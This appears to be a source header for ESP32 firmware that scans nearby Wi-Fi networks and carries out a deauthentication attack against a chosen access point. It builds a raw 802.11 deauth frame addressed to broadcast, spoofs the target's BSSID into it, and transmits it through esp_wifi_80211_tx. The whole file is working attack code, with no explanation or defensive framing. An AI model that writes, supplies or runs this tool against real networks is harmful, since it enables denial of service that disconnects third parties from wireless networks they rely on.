#pragma once
#include <WiFi.h>
#include <esp_wifi.h>

struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

const uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

WiFiNetwork scannedNetworks[20];
int networkCount = 0;
int targetChannel = 1;
uint8_t targetBSSID[6];
bool deauthRunning = false;
bool deauthExecuted = false;
bool scanning = false;
unsigned long lastDeauthPacket = 0;

void startWiFiScan() {
  Serial.println("[*] Scanning for WLAN networks...");
  scanning = true;
  WiFi.scanNetworks(true);
}

void showScannedNetworks() {
  networkCount = WiFi.scanComplete();
  if (networkCount <= 0) {
    Serial.println("[!] No networks found!");
    return;
  }
  for (int i = 0; i < networkCount; i++) {
    scannedNetworks[i].ssid = WiFi.SSID(i);
    memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
    scannedNetworks[i].channel = WiFi.channel(i);
    scannedNetworks[i].rssi = WiFi.RSSI(i);
  }
}

void initDeauth() {
  deauthRunning = false;
  deauthExecuted = false;
}

void startDeauth(int index) {
  if (index < 0 || index >= networkCount) return;
  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
  targetChannel = scannedNetworks[index].channel;
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  deauthRunning = true;
  deauthExecuted = true;
}

void sendDeauth() {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  memcpy(&packet[10], targetBSSID, 6);
  memcpy(&packet[16], targetBSSID, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void stopDeauth() {
  deauthRunning = false;
  esp_wifi_set_promiscuous(false);
}